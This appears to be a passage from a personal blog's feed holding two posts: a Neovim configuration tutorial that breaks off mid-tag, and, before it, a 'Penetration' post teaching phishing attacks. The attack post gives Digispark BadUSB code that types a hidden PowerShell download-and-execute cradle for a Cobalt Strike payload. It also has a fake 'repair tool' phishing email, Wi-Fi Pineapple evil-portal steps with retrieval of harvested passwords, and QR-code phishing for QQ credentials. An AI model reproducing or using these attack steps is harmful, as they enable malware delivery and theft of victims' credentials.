id="Case-2-CS-release"><a href="#Case-2-CS-release" class="headerlink" title="Case 2: CS release"></a>Case 2: CS release</h3><p>Where xxxx is the <code>CobaltStrike</code> HTTP release address</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DigiKeyboardFr.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">  DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">  DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK);</span><br><span class="line">  DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;powershell.exe -nop -w hidden -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;xxxx&#x27;))&#x27;&quot;</span>);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Insert Digispark to release it~</li></ul><h1 id="Mail-phishing-CS-release"><a href="#Mail-phishing-CS-release" class="headerlink" title="Mail phishing CS release"></a>Mail phishing CS release</h1><h2 id="Email-content"><a href="#Email-content" class="headerlink" title="Email content"></a>Email content</h2><p>Email content (this requires the user to write a paragraph):</p><blockquote><p>Recently, there has been a xx vulnerability. The company contacted the xx manufacturer to provide a xx vulnerability repair tool. Please be sure to open it for repair<br>Download the repair tool:xxxx</p></blockquote><ul><li>And you can put a Trojan File into this phishing mail~</li></ul><h1 id="Wi-Fi-Pineapple-Wi-Fi-Phishing-information-collection"><a href="#Wi-Fi-Pineapple-Wi-Fi-Phishing-information-collection" class="headerlink" title="Wi-Fi Pineapple Wi-Fi Phishing information collection"></a>Wi-Fi Pineapple Wi-Fi Phishing information collection</h1><p>Start pineapple pie, install 4 net cables and plug in power</p><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225108.png" alt="image.png"></p><h2 id="Start-the-pineapple-pie"><a href="#Start-the-pineapple-pie" class="headerlink" title="Start the pineapple pie"></a>Start the pineapple pie</h2><ol><li>Connect to the pineapple pie management WIFI</li><li>Open the browser and visit the pineapple pie management address: <code>172.16.42.1:1471</code>, You can access the administrative address of Wifi Pineapple<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225142.png" alt="image.png"></li></ol><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225147.png" alt="image.png"></p><h2 id="Configure-network-bridging-networking-pineapple-pie"><a href="#Configure-network-bridging-networking-pineapple-pie" class="headerlink" title="Configure network bridging (networking pineapple pie)"></a>Configure network bridging (networking pineapple pie)</h2><p>The purpose of this operation is to logically:</p><blockquote><p>Victim -&gt; Pineapple pie -&gt; Internet</p></blockquote><p>The network structure allows the victim to connect to the pineapple pie’s phishing wifi and still be able to access the Internet, but the victim does not know that there is a pineapple pie between him and the Internet<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322230835.png" alt="image.png"></p><p>(When you click scan to scan the wifi, you can click several times until you scan the available wifi)</p><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225232.png" alt="image.png"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225247.png" alt="image.png"></p><h2 id="Phishing-with-the-Evil-Portal-plugin"><a href="#Phishing-with-the-Evil-Portal-plugin" class="headerlink" title="Phishing with the Evil Portal plugin"></a>Phishing with the Evil Portal plugin</h2><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322230918.png" alt="image.png"></p><p>Then the victim will search for your phishing wifi SSID in his WIFI, and a pop-up window will appear on the landing page</p><ul><li>Enter the password and you will be phished~<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322230942.png" alt="image.png"></li></ul><h2 id="If-you-want-to-make-changes-to-the-phishing-page"><a href="#If-you-want-to-make-changes-to-the-phishing-page" class="headerlink" title="If you want to make changes to the phishing page"></a>If you want to make changes to the phishing page</h2><p>When you have bridged the pineapple pie to the network, the pineapple pie itself can connect to the external network</p><p>Connect to the pineapple pie management address just created, use <em>XSHELL</em> or the command line ssh connection tool, use ssh to log in to the pineapple pie terminal.</p><p>After successful login, the display looks like this.</p><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225351.png" alt="image.png"></p><p>Use the command to enter the port-xxxx directory(The filepath of your phishing website)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> portals/xxxx/</span><br></pre></td></tr></table></figure><p>You can see the relevant web files, just modify them~</p><h2 id="How-to-check-phishing-passwords"><a href="#How-to-check-phishing-passwords" class="headerlink" title="How to check phishing passwords"></a>How to check phishing passwords</h2><p>Log in to the backend of pineapple pie and enter the portal&#x2F;xxxx folder<br>The password is stored in the pwd.txt file<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322231248.png" alt="image.png"></p><h1 id="QR-code-phishing-information-collection"><a href="#QR-code-phishing-information-collection" class="headerlink" title="QR code phishing information collection"></a>QR code phishing information collection</h1><p>Let the victim directly scan the QR code, you can pop up the pop-up window of the QQ Zone (just for demonstration, modify its front-end page to make it more simulation), the victim fills in the account password, you can receive the information filled in at the server level, resulting in information leakage</p><h2 id="Build-your-own-QR-code-phishing-server-receiver"><a href="#Build-your-own-QR-code-phishing-server-receiver" class="headerlink" title="Build your own QR code phishing server receiver"></a>Build your own QR code phishing server receiver</h2><p>Visit github for a detailed build tutorial:<br><a href="https://github.com/Cl0udG0d/QQFishing">GitHub - Cl0udG0d&#x2F;QQFishing: QQ钓鱼，社会工程</a></p><ul><li>Set up this service on your own server (you need to install docker-compose in advance), and then execute the following commands in sequence:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Cl0udG0d/QQFishing</span><br><span class="line"><span class="built_in">cd</span> QQFishing</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>After setting up, access the server <code>http://IP:5000</code> to access its phishing address</p><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225556.png" alt="image.png"></p><h2 id="Generate-QR-code"><a href="#Generate-QR-code" class="headerlink" title="Generate QR code"></a>Generate QR code</h2><p>Baidu casually search for a QR code generation online tool that can embed pictures, such as:<br><a href="https://cn.online-qrcode-generator.com/">免费在线二维码生成器</a></p><p>Generate the phishing URL as a QR code, and the victim can scan the QR code to achieve the purpose of opening the phishing page, such as<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322225646.png" alt="image.png"><br>(This QR code is just an example, users need to regenerate it themselves)</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;BadUSB-Phishing-CS-released&quot;&gt;&lt;a href=&quot;#BadUSB-Phishing-CS-released&quot; class=&quot;headerlink&quot; title=&quot;BadUSB Phishing CS released&quot;&gt;&lt;/a&gt;BadUSB Phishing CS released&lt;/h1&gt;&lt;p&gt;Use the tool &lt;strong&gt;Digispark&lt;/strong&gt;, shaped like a USB memory stick, and use the Arduino compilation to burn programs into it.&lt;/p&gt;
&lt;h2 id=&quot;Install-Arduino-debugging-software&quot;&gt;&lt;a href=&quot;#Install-Arduino-debugging-software&quot; class=&quot;headerlink&quot; title=&quot;Install Arduino debugging software&quot;&gt;&lt;/a&gt;Install Arduino debugging software&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Open the Arduino website &lt;a href=&quot;https://www.arduino.cc/&quot;&gt;Arduino - Home&lt;/a&gt; and click Software.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/20230322224449.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Penetration" scheme="https://resek4.github.io/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>Neovim, my favourite editor!</title>
    <link href="https://resek4.github.io/2022/06/23/Vim/"/>
    <id>https://resek4.github.io/2022/06/23/Vim/</id>
    <published>2022-06-22T16:00:00.000Z</published>
    <updated>2023-02-26T05:25:33.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Some-hotkey-to-operate-vim"><a href="#Some-hotkey-to-operate-vim" class="headerlink" title="Some hotkey to operate vim"></a>Some hotkey to operate vim</h1><h2 id="Use-vim-plug-in-neovim"><a href="#Use-vim-plug-in-neovim" class="headerlink" title="Use vim-plug in neovim"></a>Use vim-plug in neovim</h2><ul><li><p>The neovim config file is in <code>~/.config/nvim/init.vim</code><br>w<br>we should create two directory</p></li><li><p><code>~/.config/nvim/autoload</code></p></li><li><p><code>~/.config/nvim/plugged</code></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.config/nvim/autoload ~/.config/nvim/plugged</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Download vim-plug</span></span><br><span class="line">curl -fLo ~/.config/nvim/autoload/plug.vim https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure><span id="more"></span><p>Append new lines in vim config file(<code>Neovim</code> is in <code>~/.config/nvim/init.vim</code>)</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">call</span> plug#begin(<span class="string">&#x27;~/.config/nvim/plugged&#x27;</span>)</span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="keyword">call</span> plug#end()</span><br></pre></td></tr></table></figure><p>Then,reload the config file,change vim to the command mode, tap these</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:PlugInstall</span><br></pre></td></tr></table></figure><p>And you have completely installed the vim-plug</p><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Pasted%20image%2020220602165151.png"></p><!-- more --><h2 id="Single-option-to-edit"><a href="#Single-option-to-edit" class="headerlink" title="Single option to edit"></a>Single option to edit</h2><ul><li>Command <code>a</code> could get into the insert mode after the current character.</li><li>Command <code>Shift</code> + <code>a</code> could get into the insert mode at the last of the current line.</li><li>The command <code>i</code> could get into the insert mode before the current character.</li><li>Command <code>Shift</code>+ <code>i</code> could get into the insert mode at the begin of the current line.</li><li>Command <code>o</code>  could get into the insert mode at the next line beginning.</li><li>Command <code>Shift</code>+<code>o</code> could get into the insert mode at the previous line beginning.</li><li>Command <code>u</code> could undo the previous actoin.</li><li>We can use <code>&quot;</code> to comment the vimrc</li><li>In the command mode,keyword <code>%</code> means the current file itself.</li><li>We can use <code>$</code> to move the cursor to the end of a line</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;operation&gt; &lt;motion&gt; <span class="comment"># The command format is Kind of this mode</span></span><br></pre></td></tr></table></figure><p><code>d</code> command is the delete key<br>When we use <code>d</code>+<code>Right</code>+<code>3</code>,means delete 3 letters on the right side</p><ul><li>Tap<code>: set spell</code>，the incorrect syntax will be found.</li></ul><p>choose a incorrect word,tap<code>z=</code>,then,you will find lots of words advice from vim.</p><ul><li>When you jump to another place,you want to go back to the previous code block,you could use</li></ul><p><code>Ctrl</code> + <code>o</code>,also,you could use <code>Ctrl</code> + <code>i</code> to go back again</p><ul><li>When your cursor is on a filepath，tap <code>gf</code> to open it within the current window(then you can also tap <code>Ctrl</code> + <code>o</code> to go back to the previous file)</li></ul><blockquote><p>⭐️Tip one<br><em>If you are editing a <code>/etc</code>file but don’t have the root privilege,and exit will lose the contents forever.<br>Then you can tap these commands to save your data</em></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: <span class="keyword">w</span> !sudo tee %</span><br></pre></td></tr></table></figure><p><em>then you input some enter will be right</em><br>Attention: this command is perfect to run in vim,but not neovim</p><p>⭐️Tip two<br>we can append a rule in vimrc,like</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">map</span> \<span class="symbol">&lt;LEADER&gt;</span>\<span class="symbol">&lt;LEADER&gt;</span> \<span class="symbol">&lt;Esc&gt;</span>/&lt;++&gt;\<span class="symbol">&lt;CR&gt;</span>: <span class="keyword">nohlsearch</span>\<span class="symbol">&lt;CR&gt;</span>c4l</span><br></pre></td></tr></table></figure><p><em>From now on,if we write <code>&lt;++&gt;</code> in a file,then we tap double spaces we can change  new characters replacing the previous one.</em></p><p>⭐️Tip three<br>a combo with figlet</p><ul><li>install the figlet(<code>brew install figlet</code>)</li><li>tap these commands to insert a figlet words into the file</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: r !figlet NICE</span><br></pre></td></tr></table></figure><p>then we’ll get this one<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Pasted%20image%2020220604000225.png"></p><p>⭐️Tip four<br>print the vim file into the HTML format (will open another vim window)</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%TOhtml</span><br></pre></td></tr></table></figure><p>when we tap <code>wq</code> in the new genarete file,we can open it with the browser<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/Pasted%20image%2020220604001036.png"></p></blockquote><h2 id="Edit-the-vimrc"><a href="#Edit-the-vimrc" class="headerlink" title="Edit the vimrc"></a>Edit the vimrc</h2><h2 id="Use-map-to-custom-the-keybind"><a href="#Use-map-to-custom-the-keybind" class="headerlink" title="Use map to custom the keybind"></a>Use map to custom the keybind</h2><h3 id="Custom-setting"><a href="#Custom-setting" class="headerlink" title="Custom setting"></a>Custom setting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># increase the line number</span></span><br><span class="line"><span class="built_in">set</span> number</span><br><span class="line"></span><br><span class="line"><span class="comment"># syntax highlighting</span></span><br><span class="line">syntax on</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a underline on current editing line</span></span><br><span class="line"><span class="built_in">set</span> cursorline</span><br><span class="line"></span><br><span class="line"><span class="comment"># use Tab to complete the command</span></span><br><span class="line"><span class="built_in">set</span> wildmenu</span><br><span class="line"></span><br><span class="line"><span class="comment"># make text auto fit current window</span></span><br><span class="line"><span class="built_in">set</span> wrap</span><br><span class="line"></span><br><span class="line"><span class="comment"># make your vim adapted with the elder version</span></span><br><span class="line"><span class="built_in">set</span> nocompatible</span><br><span class="line"></span><br><span class="line"><span class="comment"># custom the indent(when you use python or other language),There must be no spaces around the &quot;=&quot;</span></span><br><span class="line"><span class="built_in">set</span> tabstop=2</span><br><span class="line"><span class="built_in">set</span> shiftwidth=2</span><br><span class="line"><span class="built_in">set</span> softtabstop=2</span><br><span class="line"></span><br><span class="line"><span class="comment"># make your editing line always keep the medium of your screen</span></span><br><span class="line"><span class="built_in">set</span> scrolloff=5</span><br><span class="line"></span><br><span class="line"><span class="comment"># use the option,we could restore the editing position latest edited when we open the file again next time</span></span><br><span class="line">au BufReadPost * <span class="keyword">if</span> line(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &gt; 1 &amp;&amp; line(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &lt;= line(<span class="string">&quot;$&quot;</span>) | exe <span class="string">&quot;normal! g&#x27;\&quot;&quot;</span> | endif</span><br></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tap j,means k</span></span><br><span class="line">map j k</span><br><span class="line"></span><br><span class="line"><span class="comment"># tap Ctrl+s，means :wq+enter</span></span><br><span class="line">map &lt;C-s&gt; :wq&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># deny the recursive query</span></span><br><span class="line">noremap j k</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>Special keys</p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">notation        meaning             equivalent  decimal value(s)</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="symbol">&lt;Nul&gt;</span>           zero                    CTRL-@    <span class="number">0</span> (stored <span class="keyword">as</span> <span class="number">10</span>) <span class="symbol">&lt;Nul&gt;</span></span><br><span class="line"><span class="symbol">&lt;BS&gt;</span>            backspace               CTRL-H    <span class="number">8</span>     backspace</span><br><span class="line"><span class="symbol">&lt;Tab&gt;</span>           <span class="keyword">tab</span>                     CTRL-I    <span class="number">9</span>     <span class="keyword">tab</span> Tab</span><br><span class="line">                                                        linefeed</span><br><span class="line"><span class="symbol">&lt;NL&gt;</span>            linefeed                CTRL-J   <span class="number">10</span> (used <span class="keyword">for</span> <span class="symbol">&lt;Nul&gt;</span>)</span><br><span class="line"><span class="symbol">&lt;FF&gt;</span>            formfeed                CTRL-L   <span class="number">12</span>     formfeed</span><br><span class="line"><span class="symbol">&lt;CR&gt;</span>            carriage <span class="keyword">return</span>         CTRL-M   <span class="number">13</span>     carriage-<span class="keyword">return</span></span><br><span class="line"><span class="symbol">&lt;Return&gt;</span>        same <span class="keyword">as</span> <span class="symbol">&lt;CR&gt;</span>                            <span class="symbol">&lt;Return&gt;</span></span><br><span class="line"><span class="symbol">&lt;Enter&gt;</span>         same <span class="keyword">as</span> <span class="symbol">&lt;CR&gt;</span>                            <span class="symbol">&lt;Enter&gt;</span></span><br><span class="line"><span class="symbol">&lt;Esc&gt;</span>           <span class="built_in">escape</span>                  CTRL-[   <span class="number">27</span>     <span class="built_in">escape</span> <span class="symbol">&lt;Esc&gt;</span></span><br><span class="line"><span class="symbol">&lt;Space&gt;</span>         space                            <span class="number">32</span>     space</span><br><span class="line"><span class="symbol">&lt;lt&gt;</span>            less-than               &lt;        <span class="number">60</span>     <span class="symbol">&lt;lt&gt;</span></span><br><span class="line"><span class="symbol">&lt;Bslash&gt;</span>        backslash               \        <span class="number">92</span>     backslash <span class="symbol">&lt;Bslash&gt;</span></span><br><span class="line"><span class="symbol">&lt;Bar&gt;</span>           <span class="keyword">vertical</span> bar            |       <span class="number">124</span>     <span class="symbol">&lt;Bar&gt;</span></span><br><span class="line"><span class="symbol">&lt;Del&gt;</span>           <span class="keyword">delete</span>                          <span class="number">127</span></span><br><span class="line"><span class="symbol">&lt;CSI&gt;</span>           <span class="keyword">command</span> sequence <span class="keyword">intro</span>  ALT-Esc <span class="number">155</span>     <span class="symbol">&lt;CSI&gt;</span></span><br><span class="line"><span class="symbol">&lt;xCSI&gt;</span>          CSI when typed in the GUI               <span class="symbol">&lt;xCSI&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;EOL&gt;</span>           end-of-<span class="built_in">line</span> (can <span class="keyword">be</span> <span class="symbol">&lt;CR&gt;</span>, <span class="symbol">&lt;LF&gt;</span> <span class="built_in">or</span> <span class="symbol">&lt;CR&gt;</span><span class="symbol">&lt;LF&gt;</span>,</span><br><span class="line">                depends <span class="keyword">on</span> <span class="built_in">system</span> <span class="built_in">and</span> <span class="string">&#x27;fileformat&#x27;</span>)     <span class="symbol">&lt;EOL&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;Up&gt;</span>            <span class="built_in">cursor</span>-<span class="keyword">up</span>                       <span class="built_in">cursor</span>-<span class="keyword">up</span> cursor_up</span><br><span class="line"><span class="symbol">&lt;Down&gt;</span>          <span class="built_in">cursor</span>-down                     <span class="built_in">cursor</span>-down cursor_down</span><br><span class="line"><span class="symbol">&lt;Left&gt;</span>          <span class="built_in">cursor</span>-<span class="keyword">left</span>                     <span class="built_in">cursor</span>-<span class="keyword">left</span> cursor_left</span><br><span class="line"><span class="symbol">&lt;Right&gt;</span>         <span class="built_in">cursor</span>-<span class="keyword">right</span>                    <span class="built_in">cursor</span>-<span class="keyword">right</span> cursor_right</span><br><span class="line"><span class="symbol">&lt;S-Up&gt;</span>          shift-<span class="built_in">cursor</span>-<span class="keyword">up</span></span><br><span class="line"><span class="symbol">&lt;S-Down&gt;</span>        shift-<span class="built_in">cursor</span>-down</span><br><span class="line"><span class="symbol">&lt;S-Left&gt;</span>        shift-<span class="built_in">cursor</span>-<span class="keyword">left</span></span><br><span class="line"><span class="symbol">&lt;S-Right&gt;</span>       shift-<span class="built_in">cursor</span>-<span class="keyword">right</span></span><br><span class="line"><span class="symbol">&lt;C-Left&gt;</span>        control-<span class="built_in">cursor</span>-<span class="keyword">left</span></span><br><span class="line"><span class="symbol">&lt;C-Right&gt;</span>       control-<span class="built_in">cursor</span>-<span class="keyword">right</span></span><br><span class="line"><span class="symbol">&lt;F1&gt;</span> - <span class="symbol">&lt;F12&gt;</span>    <span class="keyword">function</span> <span class="title">keys</span> 1 to 12           function_key function-key</span><br><span class="line"><span class="symbol">&lt;S-F1&gt;</span> - <span class="symbol">&lt;S-F12&gt;</span> shift-<span class="keyword">function</span> <span class="title">keys</span> 1 to 12    &lt;S-F1&gt;</span><br><span class="line"><span class="symbol">&lt;Help&gt;</span>          <span class="keyword">help</span> key</span><br><span class="line"><span class="symbol">&lt;Undo&gt;</span>          <span class="keyword">undo</span> key</span><br><span class="line"><span class="symbol">&lt;Insert&gt;</span>        <span class="keyword">insert</span> key</span><br><span class="line"><span class="symbol">&lt;Home&gt;</span>          home                            home</span><br><span class="line"><span class="symbol">&lt;End&gt;</span>           end                             end</span><br><span class="line"><span class="symbol">&lt;PageUp&gt;</span>        page-<span class="keyword">up</span>                         page_up page-<span class="keyword">up</span></span><br><span class="line"><span class="symbol">&lt;PageDown&gt;</span>      page-down                       page_down page-down</span><br><span class="line"><span class="symbol">&lt;kHome&gt;</span>         keypad home (upper <span class="keyword">left</span>)        keypad-home</span><br><span class="line"><span class="symbol">&lt;kEnd&gt;</span>          keypad end (lower <span class="keyword">left</span>)         keypad-end</span><br><span class="line"><span class="symbol">&lt;kPageUp&gt;</span>       keypad page-<span class="keyword">up</span> (upper <span class="keyword">right</span>)    keypad-page-<span class="keyword">up</span></span><br><span class="line"><span class="symbol">&lt;kPageDown&gt;</span>     keypad page-down (lower <span class="keyword">right</span>)  keypad-page-down</span><br><span class="line"><span class="symbol">&lt;kPlus&gt;</span>         keypad +                        keypad-plus</span><br><span class="line"><span class="symbol">&lt;kMinus&gt;</span>        keypad -                        keypad-minus</span><br><span class="line"><span class="symbol">&lt;kMultiply&gt;</span>     keypad *                        keypad-multiply</span><br><span class="line"><span class="symbol">&lt;kDivide&gt;</span>       keypad /                        keypad-divide</span><br><span class="line"><span class="symbol">&lt;kEnter&gt;</span>        keypad Enter                    keypad-enter</span><br><span class="line"><span class="symbol">&lt;kPoint&gt;</span>        keypad Decimal point            keypad-point</span><br><span class="line"><span class="symbol">&lt;k0&gt;</span> - <span class="symbol">&lt;k9&gt;</span>     keypad <span class="number">0</span> <span class="keyword">to</span> <span class="number">9</span>                   keypad-<span class="number">0</span> keypad-<span class="number">9</span></span><br><span class="line">&lt;S-...&gt;         shift-key                       shift &lt;S-</span><br><span class="line">&lt;C-...&gt;         control-key                     control ctrl &lt;C-</span><br><span class="line">&lt;M-...&gt;         alt-key <span class="built_in">or</span> meta-key             meta alt &lt;M-</span><br><span class="line">&lt;A-...&gt;         same <span class="keyword">as</span> &lt;M-...&gt;                 &lt;A-</span><br><span class="line">&lt;D-...&gt;         <span class="keyword">command</span>-key (Macintosh <span class="keyword">only</span>)    &lt;D-</span><br><span class="line"><span class="symbol">&lt;t_xx&gt;</span>          key with <span class="string">&quot;xx&quot;</span> entry in termcap</span><br></pre></td></tr></table></figure><h3 id="Split-your-vim-workspace"><a href="#Split-your-vim-workspace" class="headerlink" title="Split your vim workspace"></a>Split your vim workspace</h3><p>Edit the vim config file<code>~/.config/nvim/init.vim</code>,then append these configurations</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set a mapleader key</span></span><br><span class="line"><span class="built_in">let</span> mapleader = <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># horizontal split your vim workspace</span></span><br><span class="line">map `h :<span class="built_in">set</span> nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;</span><br><span class="line">map `l :<span class="built_in">set</span> splitright&lt;CR&gt;:vsplit&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># vertical split your vim workspace</span></span><br><span class="line">map `j :<span class="built_in">set</span> nosplitbelow&lt;CR&gt;:<span class="built_in">split</span>&lt;CR&gt;</span><br><span class="line">map `k :<span class="built_in">set</span> splitbelow&lt;CR&gt;:<span class="built_in">split</span>&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># move your cursor to the other workspace</span></span><br><span class="line">map &lt;LEADER&gt;h &lt;C-w&gt;h</span><br><span class="line">map &lt;LEADER&gt;j &lt;C-w&gt;j</span><br><span class="line">map &lt;LEADER&gt;k &lt;C-w&gt;k</span><br><span class="line">map &lt;LEADER&gt;l &lt;C-w&gt;l</span><br></pre></td></tr></table></figure><p>open another file,we can tap<code>: e ~/try/2.txt</code>to open another file in your vim</p><h3 id="Vim-Tab-Manager"><a href="#Vim-Tab-Manager" class="headerlink" title="Vim Tab Manager"></a>Vim Tab Manager</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create a new tab</span></span><br><span class="line">map tn :tabe&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># previous tab</span></span><br><span class="line">map th :-tabnext&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># next tab</span></span><br><span class="line">map tl :+tabnext&lt;CR&gt;</span><br></pre></td></tr></table></figure><h2 id="Recoding-a-macro"><a 